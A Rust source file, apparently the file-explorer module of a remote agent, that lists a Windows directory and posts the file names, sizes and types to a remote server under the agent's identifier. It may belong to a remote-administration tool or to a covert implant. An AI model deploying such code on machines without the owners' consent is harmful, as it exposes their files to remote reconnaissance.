use crate::State;
use shared::models::{Directory, File};
use std::{fs, os::windows::fs::FileTypeExt, sync::Arc};
use tokio::sync::Mutex;

pub async fn execute(
    input: &String,
    state: &Arc<Mutex<State>>,
) -> Result<Box<str>, Box<dyn std::error::Error + Send + Sync>> {
    let paths = match fs::read_dir(input) {
        Ok(paths) => paths,
        Err(e) => {
            return Err(Box::new(e));
        }
    };
    let mut files = Vec::new();
    for path in paths {
        let path = match path {
            Ok(path) => path,
            Err(e) => {
                return Err(Box::new(e));
            }
        };

        let file = File {
            name: path.file_name().to_str().unwrap().to_string(),
            size: path.metadata().unwrap().len(),
            is_dir: path.file_type().unwrap().is_dir()
                || path.file_type().unwrap().is_symlink_dir(),
            created_at: 0,
            modified_at: 0,
        };
        files.push(file);
    }

    let state = state.lock().await;
    let agent = state.uuid;

    let directory = Directory {
        files,
        agent: agent.clone(),
        path: input.clone(),
    };

    let http = state.http.lock().await;
    let _ = http
        .post(format!("{}/explorer/{}", state.remote_server, agent))
        .json(&directory)
        .send()
        .await?;

    Ok(Box::from("Ok"))
}
